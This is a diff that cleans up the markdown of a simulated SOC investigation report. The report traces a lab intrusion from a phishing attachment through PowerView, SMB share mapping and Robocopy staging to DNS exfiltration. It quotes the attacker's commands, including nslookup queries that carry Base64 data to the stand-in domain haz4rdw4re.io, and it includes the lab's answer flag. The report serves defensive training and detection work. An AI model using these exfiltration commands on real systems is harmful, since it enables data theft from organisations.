@@ -1,6 +1,6 @@
 # Enterprise SOC Incident Investigation & Threat Hunting Report
 
-> **Training / Lab Investigation:** This report documents a simulated enterprise **SOC** investigation performed as part of hands-on cybersecurity training. Hostnames, accounts, domains, and other artifacts belong to the exercise environment and should not be interpreted as evidence of a real-world incident.
+> **Training / Lab Investigation:** This report documents a simulated enterprise SOC investigation performed as part of hands-on cybersecurity training. Hostnames, accounts, domains, and other artifacts belong to the exercise environment and should not be interpreted as evidence of a real-world incident.
 
 ## Incident Overview
 
@@ -19,54 +19,60 @@
 
 ## 1. Executive Summary
 
-During a simulated real-time Security Operations Center (**SOC**) alert triage exercise, **SIEM** event logs and Sysmon telemetry were used to investigate a series of correlated security events across enterprise endpoints.
+During a simulated real-time Security Operations Center (SOC) alert triage exercise, SIEM event logs and Sysmon telemetry were used to investigate a series of correlated security events across enterprise endpoints.
 
 Several alerts in the initial investigation queue were determined to be benign or false positives, including legitimate Windows system activity and email alerts that lacked additional malicious indicators.
 
-However, investigation of host `win-**3450**` identified a confirmed multi-stage intrusion involving the account `michael.ascot`.
+However, investigation of host `win-3450` identified a confirmed multi-stage intrusion involving the account `michael.ascot`.
 
 The observed attack chain included:
 
-## Phishing-based initial access.
-
-## PowerShell activity resulting in the creation of `PowerView.ps1`. ## Active Directory and domain reconnaissance. ## Access to a sensitive SMB financial share. ## Bulk data collection using `Robocopy.exe`. ## Local staging of collected files. ## Removal of the mapped SMB drive. ## Covert DNS-based data exfiltration using `nslookup.exe`. ## Reconstruction of encoded payload fragments from DNS queries.
+1. Phishing-based initial access.
+2. PowerShell activity resulting in the creation of `PowerView.ps1`.
+3. Active Directory and domain reconnaissance.
+4. Access to a sensitive SMB financial share.
+5. Bulk data collection using `Robocopy.exe`.
+6. Local staging of collected files.
+7. Removal of the mapped SMB drive.
+8. Covert DNS-based data exfiltration using `nslookup.exe`.
+9. Reconstruction of encoded payload fragments from DNS queries.
 
 The investigation demonstrated how individual low-level telemetry events can be correlated into a complete attack chain.
 
 ### Attack Chain
 
 ```text
-### Initial Access
-### Phishing Attachment
-    |
-    v
+Initial Access
+Phishing Attachment
+        |
+        v
 PowerShell / PowerView
-### Domain Reconnaissance
-    |
-    v
-**SMB** Share Access
-\\**FILESRV**-01\**SSF**-FinancialRecords
-    |
-    v
-### Data Collection
+Domain Reconnaissance
+        |
+        v
+SMB Share Access
+\\FILESRV-01\SSF-FinancialRecords
+        |
+        v
+Data Collection
 Robocopy.exe
-    |
-    v
-### Local Data Staging
+        |
+        v
+Local Data Staging
 C:\Users\michael.ascot\Downloads\exfiltration\
-    |
-    v
-### Defense Evasion
+        |
+        v
+Defense Evasion
 net.exe use Z: /delete
-    |
-    v
-**DNS**-Based Exfiltration
+        |
+        v
+DNS-Based Exfiltration
 nslookup.exe
-    |
-    v
+        |
+        v
 *.haz4rdw4re.io
-    |
-    v
+        |
+        v
 Encoded Data / File Fragments
 ```
 
@@ -86,15 +92,15 @@ The investigation focused on:
 - Investigating potential defense evasion.
 - Identifying command-and-control infrastructure.
 - Determining whether data was exfiltrated.
-- Reconstructing encoded data contained within **DNS** queries.
-- Separating genuine malicious activity from unrelated **SOC** noise.
+- Reconstructing encoded data contained within DNS queries.
+- Separating genuine malicious activity from unrelated SOC noise.
 - Developing containment, eradication, and hardening recommendations.
 
 ---
 
 # 3. Complete Technical Timeline
 
-All times below are recorded in **UTC** as provided by the training environment.
+All times below are recorded in UTC as provided by the training environment.
 
 | Time (UTC) | Event | Host | Source / Process | Key Artifacts | Analysis / Phase |
 |---|---|---|---|---|---|
@@ -122,21 +128,27 @@ All times below are recorded in **UTC** as provided by the training environment.
 
 The investigation began with an inbound email alert involving:
 
-```text ImportantInvoice-Febrary.zip ```
+```text
+ImportantInvoice-Febrary.zip
+```
 
 The attachment was delivered to:
 
-```text michael.ascot ```
+```text
+michael.ascot
+```
 
 on:
 
-```text win-**3450** ```
+```text
+win-3450
+```
 
 The event was assessed as the initial access vector.
 
 ### MITRE ATT&CK
 
-****T1566**.**001** — Phishing: Spearphishing Attachment**
+**T1566.001 — Phishing: Spearphishing Attachment**
 
 The attachment provided the initial entry point into the simulated environment.
 
@@ -146,19 +158,27 @@ The attachment provided the initial entry point into the simulated environment.
 
 At:
 
-```text 02:15:10 **UTC** ```
+```text
+02:15:10 UTC
+```
 
 Sysmon Event ID 11 recorded the creation of:
 
-```text C:\Users\michael.ascot\Downloads\PowerView.ps1 ```
+```text
+C:\Users\michael.ascot\Downloads\PowerView.ps1
+```
 
 The creating process was:
 
-```text powershell.exe ```
+```text
+powershell.exe
+```
 
-with **PID**:
+with PID:
 
-```text **9060** ```
+```text
+9060
+```
 
 `PowerView` is an offensive PowerShell-based tool commonly associated with Active Directory enumeration and PowerSploit.
 
@@ -175,8 +195,8 @@ Potential reconnaissance objectives included:
 
 ### Relevant ATT&CK Techniques
 
-- ****T1087** — Account Discovery**
-- ****T1069** — Permission Groups Discovery**
+- **T1087 — Account Discovery**
+- **T1069 — Permission Groups Discovery**
 - Other discovery techniques may apply depending on the specific commands executed by the script.
 
 ---
@@ -185,79 +205,103 @@ Potential reconnaissance objectives included:
 
 At:
 
-```text 02:17:05 **UTC** ```
+```text
+02:17:05 UTC
+```
 
 Sysmon Event ID 1 recorded:
 
-```text net.exe ```
+```text
+net.exe
+```
 
 being launched by:
 
-```text powershell.exe ```
+```text
+powershell.exe
+```
 
 The command line was:
 
-```cmd *C:\Windows\system32\net.exe* use Z: \\**FILESRV**-01\**SSF**-FinancialRecords ```
+```cmd
+"C:\Windows\system32\net.exe" use Z: \\FILESRV-01\SSF-FinancialRecords
+```
 
 This mapped the sensitive financial share to drive:
 
-```text Z: ```
+```text
+Z:
+```
 
 ### Important Indicators
 
-```text Source Host: win-**3450**
+```text
+Source Host:
+win-3450
 
-User: michael.ascot
+User:
+michael.ascot
 
-Parent Process: powershell.exe
+Parent Process:
+powershell.exe
 
-Child Process: net.exe
+Child Process:
+net.exe
 
-Mapped Drive: Z:
+Mapped Drive:
+Z:
 
-Target: \\**FILESRV**-01\**SSF**-FinancialRecords ```
+Target:
+\\FILESRV-01\SSF-FinancialRecords
+```
 
 The resource was identified as a high-value financial repository.
 
 ### MITRE ATT&CK
 
-****T1021**.**002** — **SMB**/Windows Admin Shares**
+**T1021.002 — SMB/Windows Admin Shares**
 
-The activity demonstrated access to an internal **SMB** resource from the compromised endpoint.
+The activity demonstrated access to an internal SMB resource from the compromised endpoint.
 
 ---
 
 # 6. Data Collection and Local Staging
 
-Approximately 47 seconds after the **SMB** share was mapped, the attacker executed:
+Approximately 47 seconds after the SMB share was mapped, the attacker executed:
 
-```cmd *C:\Windows\system32\Robocopy.exe* . C:\Users\michael.ascot\Downloads\exfiltration /E ```
+```cmd
+"C:\Windows\system32\Robocopy.exe" . C:\Users\michael.ascot\Downloads\exfiltration /E
+```
 
 The working directory was:
 
-```text Z:\ ```
+```text
+Z:\
+```
 
 Therefore, the command recursively copied files from the mapped financial share into:
 
-```text C:\Users\michael.ascot\Downloads\exfiltration\ ```
+```text
+C:\Users\michael.ascot\Downloads\exfiltration\
+```
 
 The `/E` parameter instructed `Robocopy` to copy subdirectories, including empty directories.
 
 This established a clear:
 
 ```text
-### Network Share
+Network Share
      ↓
-### Local Collection
+Local Collection
      ↓
-### Staging Directory
+Staging Directory
 ```
 
 pattern.
 
 ### MITRE ATT&CK
 
-****T1074**.**001** — Local Data Staging**
+**T1074.001 — Local Data Staging**
 
 The data was consolidated locally before the subsequent exfiltration activity.
 
@@ -267,11 +311,15 @@ The data was consolidated locally before the subsequent exfiltration activity.
 
 At:
 
-```text 02:18:03 **UTC** ```
+```text
+02:18:03 UTC
+```
 
 the attacker executed:
 
-```cmd *C:\Windows\system32\net.exe* use Z: /delete ```
+```cmd
+"C:\Windows\system32\net.exe" use Z: /delete
+```
 
 This removed the mapped network share.
 
@@ -300,29 +348,41 @@ This activity is consistent with an attempt to reduce the local footprint of the
 
 Between:
 
-```text 02:18:50 ```
+```text
+02:18:50
+```
 
 and:
 
-```text 02:19:06 ```
+```text
+02:19:06
+```
 
 the endpoint generated multiple `nslookup.exe` processes.
 
 The queries contained encoded strings embedded within subdomains of:
 
-```text haz4rdw4re.io ```
+```text
+haz4rdw4re.io
+```
 
 Example:
 
-```text nslookup.exe UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io ```
+```text
+nslookup.exe UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
+```
 
 This behaviour was significant because:
 
-## Multiple DNS queries were generated within a short time window.
+1. Multiple DNS queries were generated within a short time window.
+2. The queried subdomains contained long encoded-looking strings.
+3. The strings could be decoded into meaningful content.
+4. Some decoded content corresponded to filenames.
+5. Other content contained ZIP magic bytes.
+6. The domain was associated with the simulated attacker infrastructure.
+7. The activity occurred immediately after sensitive data was staged locally.
 
-## The queried subdomains contained long encoded-looking strings. ## The strings could be decoded into meaningful content. ## Some decoded content corresponded to filenames. ## Other content contained ZIP magic bytes. ## The domain was associated with the simulated attacker infrastructure. ## The activity occurred immediately after sensitive data was staged locally.
-
-This combination provided strong evidence of **DNS**-based data exfiltration.
+This combination provided strong evidence of DNS-based data exfiltration.
 
 ---
 
@@ -332,87 +392,123 @@ This combination provided strong evidence of **DNS**-based data exfiltration.
 
 The following query contained:
 
-```text UEsDBBQ ```
+```text
+UEsDBBQ
+```
 
 Base64 decoding produced:
 
-```text PK\x03\x04 ```
+```text
+PK\x03\x04
+```
 
-`PK\x03\x04` is the standard **ZIP** file magic-byte signature.
+`PK\x03\x04` is the standard ZIP file magic-byte signature.
 
 Another observed payload beginning with:
 
-```text AFBLAwQU ```
+```text
+AFBLAwQU
+```
 
-was also associated with **ZIP** archive data.
+was also associated with ZIP archive data.
 
-This provided evidence that binary/compressed data was being represented within the **DNS** query stream.
+This provided evidence that binary/compressed data was being represented within the DNS query stream.
 
 ---
 
 ## 9.2 Exfiltrated Filenames
 
-The investigation recovered several filenames from encoded **DNS** query fragments.
+The investigation recovered several filenames from encoded DNS query fragments.
 
 ### ClientPortfolio
 
-```text Encoded: 8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv ```
+```text
+Encoded:
+8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv
+```
 
 Decoded content included:
 
-```text ClientPortfolio ```
+```text
+ClientPortfolio
+```
 
 ### Summary.xlsx
 
-```text Encoded: U3VtbWFyeS54bHN4c87JTM0rCcgvKk ```
+```text
+Encoded:
+U3VtbWFyeS54bHN4c87JTM0rCcgvKk
+```
 
 Decoded content included:
 
-```text Summary.xlsx ```
+```text
+Summary.xlsx
+```
 
 ### Presentation2023.pptx
 
-```text Encoded: dGF0aW9uMjAyMy5wcHR488wrSy0uyS ```
+```text
+Encoded:
+dGF0aW9uMjAyMy5wcHR488wrSy0uyS
+```
 
 Decoded content included:
 
-```text Presentation2023.pptx ```
+```text
+Presentation2023.pptx
+```
 
 ### InvestorPresentation
 
-```text Encoded: AdAAAAHQAAAEludmVzdG9yUHJlc2Vu ```
+```text
+Encoded:
+AdAAAAHQAAAEludmVzdG9yUHJlc2Vu
+```
 
 Decoded content included:
 
-```text InvestorPresentation ```
+```text
+InvestorPresentation
+```
 
-These artifacts further connected the **DNS** activity to the data previously collected from the financial share.
+These artifacts further connected the DNS activity to the data previously collected from the financial share.
 
 ---
 
 # 10. Exfiltration Verification
 
-Two encoded fragments were recovered from the **DNS** query stream.
+Two encoded fragments were recovered from the DNS query stream.
 
 ### Fragment 1
 
-```text VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm ```
+```text
+VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm
+```
 
 Decoded:
 
-```text **THM**{1497321f4f6f059a52 ```
+```text
+THM{1497321f4f6f059a52
+```
 
 ### Fragment 2
 
-```text RmYjEyNGZiMTY1NjZlfQ== ```
+```text
+RmYjEyNGZiMTY1NjZlfQ==
+```
 
 Decoded:
 
-```text f6b124fb16566e} ```
+```text
+f6b124fb16566e}
+```
 
 Combining the fragments produced:
 
-```text **THM**{1497321f4f6f059a52f6b124fb16566e} ```
+```text
+THM{1497321f4f6f059a52f6b124fb16566e}
+```
 
 This was used by the training environment as verification that the exfiltration investigation had successfully reconstructed the expected payload.
 
@@ -429,7 +525,7 @@ powershell.exe
 │
 ├── net.exe
 │   └── Map Z:
-│       \\**FILESRV**-01\**SSF**-FinancialRecords
+│       \\FILESRV-01\SSF-FinancialRecords
 │
 ├── Robocopy.exe
 │   └── Copy financial data
@@ -439,11 +535,11 @@ powershell.exe
 │   └── Delete Z:
 │
 └── nslookup.exe
-    ├── Encoded **DNS** query
-    ├── Encoded **DNS** query
-    ├── Encoded **DNS** query
-    ├── Encoded **DNS** query
-    └── Encoded **DNS** query
+    ├── Encoded DNS query
+    ├── Encoded DNS query
+    ├── Encoded DNS query
+    ├── Encoded DNS query
+    └── Encoded DNS query
 ```
 
 The parent-child relationships were particularly valuable because they connected the individual commands into a coherent sequence.
@@ -455,62 +551,82 @@ The parent-child relationships were particularly valuable because they connected
 The complete activity can be represented as:
 
 ```text
-### Phishing Attachment
-    |
-    v
+Phishing Attachment
+        |
+        v
 PowerShell Execution
-    |
-    v
+        |
+        v
 PowerView.ps1
-    |
-    v
+        |
+        v
 Domain / Account Discovery
-    |
-    v
-**SMB** Financial Share Access
-    |
-    v
-### Robocopy Collection
-    |
-    v
-### Local Data Staging
-    |
-    v
-**SMB** Share Removal
-    |
-    v
+        |
+        v
+SMB Financial Share Access
+        |
+        v
+Robocopy Collection
+        |
+        v
+Local Data Staging
+        |
+        v
+SMB Share Removal
+        |
+        v
 nslookup.exe
-    |
-    v
-Encoded **DNS** Queries
-    |
-    v
-**DNS** Exfiltration
+        |
+        v
+Encoded DNS Queries
+        |
+        v
+DNS Exfiltration
 ```
 
 This sequence demonstrates why individual events should not always be investigated in isolation.
 
 A single:
 
-```text nslookup.exe ```
+```text
+nslookup.exe
+```
 
 execution might be legitimate.
 
 A single:
 
-```text Robocopy.exe ```
+```text
+Robocopy.exe
+```
 
 execution might also be legitimate.
 
 A single:
 
-```text net.exe use ```
+```text
+net.exe use
+```
 
 command may be normal administrative activity.
 
 However:
 
-```text Phishing + PowerView + Sensitive **SMB** access + ### Bulk Robocopy + Local staging + Share removal + Encoded **DNS** ```
+```text
+Phishing
+  +
+PowerView
+  +
+Sensitive SMB access
+  +
+Bulk Robocopy
+  +
+Local staging
+  +
+Share removal
+  +
+Encoded DNS
+```
 
 forms a significantly stronger behavioural chain.
 
@@ -534,17 +650,25 @@ The purpose of this triage was to distinguish genuine malicious activity from be
 
 ### Alerts
 
-```text **1018** **1035** ```
+```text
+1018
+1035
+```
 
 ### Observed Activity
 
 Inbound emails originated from domains using:
 
-```text .online gmail.com ```
+```text
+.online
+gmail.com
+```
 
 The messages contained promotional text such as:
 
-```text Win a trip to Hat Disneyland ```
+```text
+Win a trip to Hat Disneyland
+```
 
 No malicious attachments, executable scripts, or suspicious hyperlinks were identified.
 
@@ -556,14 +680,14 @@ The email rule detected a weak signal without sufficient supporting evidence.
 
 ### Recommended Tuning
 
-Increase the importance of **TLD** anomalies only when combined with additional indicators such as:
+Increase the importance of TLD anomalies only when combined with additional indicators such as:
 
 - Malicious hyperlinks.
 - Suspicious attachments.
 - Double extensions.
 - Macro-enabled documents.
 - Known malicious sender infrastructure.
-- **URL** reputation failures.
+- URL reputation failures.
 - Attachment hash matches.
 - Suspicious sender/domain reputation.
 
@@ -573,7 +697,10 @@ Increase the importance of **TLD** anomalies only when combined with additional 
 
 ### Alerts
 
-```text **1019** **1021** ```
+```text
+1019
+1021
+```
 
 ### Observed Activity
 
@@ -584,16 +711,21 @@ svchost.exe
     ↓
 taskhostw.exe
     ↓
-**KEYROAMING**
+KEYROAMING
 ```
 
 on:
 
-```text win-**3460** win-**3451** ```
+```text
+win-3460
+win-3451
+```
 
 The activity corresponded to the Windows:
 
-```text \Microsoft\Windows\CertificateServicesClient\KeyRoamingTask ```
+```text
+\Microsoft\Windows\CertificateServicesClient\KeyRoamingTask
+```
 
 scheduled task.
 
@@ -631,7 +763,7 @@ Baseline exclusions should be narrowly scoped rather than broadly excluding the 
 | Command and Control / Exfiltration | DNS | **T1071.004** | `*.haz4rdw4re.io` |
 | Exfiltration | Exfiltration Over C2 Channel | **T1041** | Data transmitted through attacker-controlled infrastructure |
 
-> **ATT**&CK mappings should be treated as evidence-based classifications. The presence of a command or tool does not automatically prove that every associated technique was used.
+> ATT&CK mappings should be treated as evidence-based classifications. The presence of a command or tool does not automatically prove that every associated technique was used.
 
 ---
 
@@ -652,19 +784,27 @@ Baseline exclusions should be narrowly scoped rather than broadly excluding the 
 
 ### SMB Share Mapping
 
-```cmd net.exe use Z: \\**FILESRV**-01\**SSF**-FinancialRecords ```
+```cmd
+net.exe use Z: \\FILESRV-01\SSF-FinancialRecords
+```
 
 ### Data Collection
 
-```cmd Robocopy.exe . C:\Users\michael.ascot\Downloads\exfiltration /E ```
+```cmd
+Robocopy.exe . C:\Users\michael.ascot\Downloads\exfiltration /E
+```
 
 ### Share Removal
 
-```cmd net.exe use Z: /delete ```
+```cmd
+net.exe use Z: /delete
+```
 
 ### DNS Exfiltration Pattern
 
-```text nslookup.exe <Base64_Payload>.haz4rdw4re.io ```
+```text
+nslookup.exe <Base64_Payload>.haz4rdw4re.io
+```
 
 ---
 
@@ -684,9 +824,11 @@ Baseline exclusions should be narrowly scoped rather than broadly excluding the 
 
 ### 1. Isolate the Endpoint
 
-Use the enterprise **EDR** to isolate:
+Use the enterprise EDR to isolate:
 
-```text win-**3450** ```
+```text
+win-3450
+```
 
 The objective is to prevent further communication with the attacker infrastructure while preserving the endpoint for investigation.
 
@@ -696,7 +838,11 @@ Identify and terminate the malicious PowerShell process and associated child pro
 
 Relevant processes include:
 
-```text powershell.exe nslookup.exe Robocopy.exe ```
+```text
+powershell.exe
+nslookup.exe
+Robocopy.exe
+```
 
 Process termination should be coordinated with evidence-preservation requirements.
 
@@ -704,26 +850,31 @@ Process termination should be coordinated with evidence-preservation requirement
 
 Block:
 
-```text haz4rdw4re.io *.haz4rdw4re.io ```
+```text
+haz4rdw4re.io
+*.haz4rdw4re.io
+```
 
 at appropriate security controls, including:
 
-- **DNS** filtering.
-- Secure web/**DNS** gateways.
+- DNS filtering.
+- Secure web/DNS gateways.
 - Firewall controls.
-- **EDR** network controls.
+- EDR network controls.
 
 ### 4. Restrict Direct External DNS
 
-Where enterprise architecture permits, prevent endpoints from directly communicating with external **DNS** infrastructure.
+Where enterprise architecture permits, prevent endpoints from directly communicating with external DNS infrastructure.
 
-Require **DNS** resolution through approved enterprise resolvers.
+Require DNS resolution through approved enterprise resolvers.
 
 ### 5. Invalidate Credentials
 
 For:
 
-```text michael.ascot ```
+```text
+michael.ascot
+```
 
 consider:
 
@@ -743,17 +894,23 @@ consider:
 
 Quarantine and preserve evidence before removal of:
 
-```text C:\Users\michael.ascot\Downloads\PowerView.ps1 ```
+```text
+C:\Users\michael.ascot\Downloads\PowerView.ps1
+```
 
 and:
 
-```text C:\Users\michael.ascot\Downloads\exfiltration\ ```
+```text
+C:\Users\michael.ascot\Downloads\exfiltration\
+```
 
 ### Review SMB Access
 
 Review:
 
-```text **FILESRV**-01 ```
+```text
+FILESRV-01
+```
 
 for:
 
@@ -770,7 +927,14 @@ Search for evidence that the compromised credentials were used on other systems.
 
 Relevant authentication telemetry may include:
 
-```text **4624** **4625** **4672** **4768** **4769** **4771** ```
+```text
+4624
+4625
+4672
+4768
+4769
+4771
+```
 
 depending on the environment.
 
@@ -781,8 +945,8 @@ Where required by organizational incident-response procedures:
 - Preserve endpoint evidence.
 - Capture memory where appropriate.
 - Preserve relevant disk evidence.
-- Preserve **SIEM** logs.
-- Preserve **DNS** logs.
+- Preserve SIEM logs.
+- Preserve DNS logs.
 - Preserve email artifacts.
 - Preserve file-server audit logs.
 
@@ -794,16 +958,16 @@ Reimaging should occur only after required forensic evidence has been collected 
 
 ## 19.1 DNS Tunnel Detection
 
-Develop detections for suspicious **DNS** behaviour including:
+Develop detections for suspicious DNS behaviour including:
 
 - Excessively long subdomains.
-- High-frequency **DNS** queries.
+- High-frequency DNS queries.
 - High-entropy labels.
 - Unusual Base64-like character distributions.
 - Repeated queries to previously unseen domains.
 - Large numbers of unique subdomains.
-- **DNS** requests generated by unusual processes.
-- Direct **DNS** traffic bypassing enterprise resolvers.
+- DNS requests generated by unusual processes.
+- Direct DNS traffic bypassing enterprise resolvers.
 
 Detection should combine multiple signals rather than relying solely on subdomain length.
 
@@ -818,12 +982,15 @@ Recommended controls include:
 - PowerShell Transcription where appropriate.
 - Constrained Language Mode where appropriate.
 - Application control.
-- **EDR** monitoring.
+- EDR monitoring.
 - Detection of suspicious command-line patterns.
 
 Relevant Windows PowerShell telemetry may include:
 
-```text **4103** **4104** ```
+```text
+4103
+4104
+```
 
 where the corresponding logging features are enabled.
 
@@ -833,14 +1000,16 @@ where the corresponding logging features are enabled.
 
 Review access to:
 
-```text \\**FILESRV**-01\**SSF**-FinancialRecords ```
+```text
+\\FILESRV-01\SSF-FinancialRecords
+```
 
 and ensure access is granted only to users and groups that require it.
 
 Review:
 
 - Share permissions.
-- **NTFS** permissions.
+- NTFS permissions.
 - Security group membership.
 - Excessive access.
 - Stale accounts.
@@ -857,11 +1026,15 @@ The investigation identified several opportunities for additional detections.
 
 Alert when:
 
-```text powershell.exe ```
+```text
+powershell.exe
+```
 
 creates or executes scripts from:
 
-```text C:\Users\*\Downloads\ ```
+```text
+C:\Users\*\Downloads\
+```
 
 especially when followed by:
 
@@ -876,13 +1049,23 @@ especially when followed by:
 
 Increase risk when:
 
-```text Robocopy.exe ```
+```text
+Robocopy.exe
+```
 
-copies large numbers of files from sensitive **SMB** shares into user-controlled local directories.
+copies large numbers of files from sensitive SMB shares into user-controlled local directories.
 
 Potential enrichment:
 
-```text ### Source Share ### Destination Directory ### File Count ### File Volume User Host ### Parent Process ```
+```text
+Source Share
+Destination Directory
+File Count
+File Volume
+User
+Host
+Parent Process
+```
 
 ---
 
@@ -890,7 +1073,9 @@ Potential enrichment:
 
 Investigate unusual execution of:
 
-```text nslookup.exe ```
+```text
+nslookup.exe
+```
 
 when it produces:
 
@@ -911,15 +1096,15 @@ PowerShell
      +
 PowerView / Discovery
      +
-**SMB** Share Access
+SMB Share Access
      +
 Robocopy
      +
-### Local Staging
+Local Staging
      +
 nslookup
      +
-Suspicious **DNS** Domain
+Suspicious DNS Domain
 ```
 
 This behavioural correlation would provide substantially stronger evidence than alerting on any individual command.
@@ -932,7 +1117,12 @@ This behavioural correlation would provide substantially stronger evidence than 
 
 Examples:
 
-```text Robocopy.exe nslookup.exe net.exe PowerShell ```
+```text
+Robocopy.exe
+nslookup.exe
+net.exe
+PowerShell
+```
 
 can all be legitimate.
 
@@ -963,13 +1153,13 @@ helped establish a coherent attack sequence.
 The short time intervals between:
 
 ```text
-**SMB** Mapping
+SMB Mapping
     ↓
-### Data Collection
+Data Collection
     ↓
-### Share Removal
+Share Removal
     ↓
-**DNS** Exfiltration
+DNS Exfiltration
 ```
 
 significantly strengthened the investigation.
@@ -980,7 +1170,9 @@ significantly strengthened the investigation.
 
 The presence of:
 
-```text Downloads\exfiltration\ ```
+```text
+Downloads\exfiltration\
+```
 
 provided an intermediate stage between internal collection and external transmission.
 
@@ -990,11 +1182,19 @@ This created a useful investigative pivot.
 
 ## 21.5 DNS Can Carry More Than Simple Name Resolution
 
-**DNS** is normally associated with name resolution, but attackers can abuse **DNS** as a communication or exfiltration channel.
+DNS is normally associated with name resolution, but attackers can abuse DNS as a communication or exfiltration channel.
 
 Indicators may include:
 
-```text Long labels High query frequency Encoded data High entropy Many unique subdomains Unusual querying processes Unusual domains ```
+```text
+Long labels
+High query frequency
+Encoded data
+High entropy
+Many unique subdomains
+Unusual querying processes
+Unusual domains
+```
 
 ---
 
@@ -1002,7 +1202,45 @@ Indicators may include:
 
 The investigation followed the general workflow:
 
-```text Alert ↓ Triage ↓ ### Identify Host ↓ ### Identify User ↓ ### Build Timeline ↓ ### Inspect Process Tree ↓ ### Identify Initial Access ↓ ### Investigate Discovery ↓ ### Investigate Internal Access ↓ ### Identify Collection ↓ ### Identify Staging ↓ Investigate C2 / Exfiltration ↓ ### Correlate Evidence ↓ Map to **ATT**&CK ↓ ### Determine Verdict ↓ Contain ↓ Eradicate ↓ Harden ↓ Document ```
+```text
+Alert
+  ↓
+Triage
+  ↓
+Identify Host
+  ↓
+Identify User
+  ↓
+Build Timeline
+  ↓
+Inspect Process Tree
+  ↓
+Identify Initial Access
+  ↓
+Investigate Discovery
+  ↓
+Investigate Internal Access
+  ↓
+Identify Collection
+  ↓
+Identify Staging
+  ↓
+Investigate C2 / Exfiltration
+  ↓
+Correlate Evidence
+  ↓
+Map to ATT&CK
+  ↓
+Determine Verdict
+  ↓
+Contain
+  ↓
+Eradicate
+  ↓
+Harden
+  ↓
+Document
+```
 
 ---
 
@@ -1010,11 +1248,15 @@ The investigation followed the general workflow:
 
 The evidence supports a confirmed multi-stage compromise of:
 
-```text win-**3450** ```
+```text
+win-3450
+```
 
 under the account:
 
-```text michael.ascot ```
+```text
+michael.ascot
+```
 
 The observed sequence was:
 
@@ -1025,22 +1267,22 @@ PowerShell
     ↓
 PowerView
     ↓
-### Domain Reconnaissance
+Domain Reconnaissance
     ↓
-Sensitive **SMB** Share Access
+Sensitive SMB Share Access
     ↓
-### Robocopy Collection
+Robocopy Collection
     ↓
-### Local Staging
+Local Staging
     ↓
-### Share Removal
+Share Removal
     ↓
-**DNS**-Based Exfiltration
+DNS-Based Exfiltration
 ```
 
-The combination of endpoint telemetry, process relationships, file activity, network-share access and encoded **DNS** queries provided sufficient evidence to reconstruct the attack chain.
+The combination of endpoint telemetry, process relationships, file activity, network-share access and encoded DNS queries provided sufficient evidence to reconstruct the attack chain.
 
-The **DNS** payload analysis additionally demonstrated that data associated with the collected files was transmitted through the simulated attacker-controlled domain.
+The DNS payload analysis additionally demonstrated that data associated with the collected files was transmitted through the simulated attacker-controlled domain.
 
 ---
 
@@ -1048,23 +1290,23 @@ The **DNS** payload analysis additionally demonstrated that data associated with
 
 This investigation demonstrated practical experience with:
 
-- **SOC** alert triage.
-- **SIEM** investigation.
+- SOC alert triage.
+- SIEM investigation.
 - Sysmon Event ID 1 analysis.
 - Sysmon Event ID 11 analysis.
 - Windows process investigation.
 - Parent-child process correlation.
 - PowerShell investigation.
 - Active Directory reconnaissance analysis.
-- **SMB**/share investigation.
+- SMB/share investigation.
 - Data collection analysis.
 - Data staging analysis.
-- **DNS** investigation.
+- DNS investigation.
 - Base64 decoding.
-- **DNS** tunnelling analysis.
-- **IOC** extraction.
+- DNS tunnelling analysis.
+- IOC extraction.
 - Timeline construction.
-- **MITRE** **ATT**&CK mapping.
+- MITRE ATT&CK mapping.
 - Cyber Kill Chain analysis.
 - False-positive identification.
 - Detection tuning.
@@ -1088,13 +1330,20 @@ It was the correlation of:
 
 ```text
 Phishing
-- PowerShell
-- PowerView
-- **SMB**
-- Robocopy
-- ### Local Staging
-- ### Share Removal
-- Encoded **DNS**
++
+PowerShell
++
+PowerView
++
+SMB
++
+Robocopy
++
+Local Staging
++
+Share Removal
++
+Encoded DNS
 ```
 
 into a single behavioural sequence.
@@ -1118,12 +1367,12 @@ into a single behavioural sequence.
 
 # 27. References
 
-- [**MITRE** **ATT**&CK](https://attack.mitre.org/)
+- [MITRE ATT&CK](https://attack.mitre.org/)
 - [Microsoft Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
 - [Microsoft Windows Security Auditing](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/basic-audit-account-logon-events)
 - [Wazuh Documentation](https://documentation.wazuh.com/)
-- [Wireshark](https://[www.wireshark.org/](https://www.wireshark.org/))
-- [Cyber Kill Chain — Lockheed Martin](https://[www.lockheedmartin.com/en-us/who-we-are/business-areas/cyber/cyber-kill-chain.html](https://www.lockheedmartin.com/en-us/who-we-are/business-areas/cyber/cyber-kill-chain.html))
+- [Wireshark](https://www.wireshark.org/)
+- [Cyber Kill Chain — Lockheed Martin](https://www.lockheedmartin.com/en-us/who-we-are/business-areas/cyber/cyber-kill-chain.html)
 
 ---
 
@@ -1133,8 +1382,25 @@ into a single behavioural sequence.
 
 **Primary Techniques:**
 
-```text **T1566**.**001** **T1087** **T1069** **T1021**.**002** **T1074**.**001** **T1071**.**004** **T1041** ```
+```text
+T1566.001
+T1087
+T1069
+T1021.002
+T1074.001
+T1071.004
+T1041
+```
 
 **Primary Evidence Sources:**
 
-```text **SIEM** Alerts Sysmon Event ID 1 Sysmon Event ID 11 ### Process Command Lines ### File Paths **SMB** Share Activity **DNS** Queries ### Decoded Payloads ```
+```text
+SIEM Alerts
+Sysmon Event ID 1
+Sysmon Event ID 11
+Process Command Lines
+File Paths
+SMB Share Activity
+DNS Queries
+Decoded Payloads
+```
